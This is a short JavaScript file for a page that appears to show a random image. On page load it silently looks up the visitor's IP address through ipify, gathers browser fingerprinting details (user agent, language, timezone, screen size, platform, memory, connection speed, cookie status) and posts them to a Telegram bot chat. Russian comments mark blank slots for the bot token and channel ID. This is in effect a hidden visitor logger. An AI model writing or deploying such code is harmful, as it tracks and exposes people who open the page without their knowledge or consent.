"use strict";

function nextImage() {
    let randomNumber = 0;
    randomNumber = Math.floor(Math.random() * 5) + 1;
    document.getElementById("main__image").src = `./img/${randomNumber}.png`;
}

window.onload = main;

function main() {
    const TOKEN = ""; // токен телеграм бота
    const CHAT_ID = ""; // айди канала
    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ipAddress = data.ip;
            sendMessage(ipAddress);
        })
        .catch(error => console.error(error));

    function sendMessage(ipAddress) {
        const dateTimeFormat = new Intl.DateTimeFormat();
        const timeZone = dateTimeFormat.resolvedOptions().timeZone;

        const connection = navigator.connection;
        const speedMBps = connection ? connection.downlink / 8 : null;

        let message = `<b>👇🏻 Новый пользователь!</b>\n\n`;
        message += `<b>🌐 IP: ${ipAddress}\n\n</b>`;
        message += `<b>🪬 Browser: ${navigator.userAgent}</b>\n\n`;
        message += `<b>🌍 Language: ${navigator.language}</b>\n`;
        message += `<b>🕚 TimeZone: ${timeZone}</b>\n`;
        message += `<b>🖥 Resolution: ${screen.width}x${screen.height}</b>\n`;
        message += `<b>☎️ Device Type: ${navigator.platform}</b>\n`;
        message += `<b>🗄 Device Memory: ${navigator.deviceMemory}GB</b>\n`;
        message += `<b>⏲ Internet Speed: ${speedMBps ? `${speedMBps}MB/s` : 'unknown'}</b>\n`;
        message += `<b>🍪 Cookies: ${navigator.cookieEnabled ? 'enabled' : 'disabled'}</b>\n`;

        axios.post(URI_API, {
            chat_id: CHAT_ID,
            parse_mode: 'html',
            text: message,
        })
            .catch(error => console.error(error));
    }
}
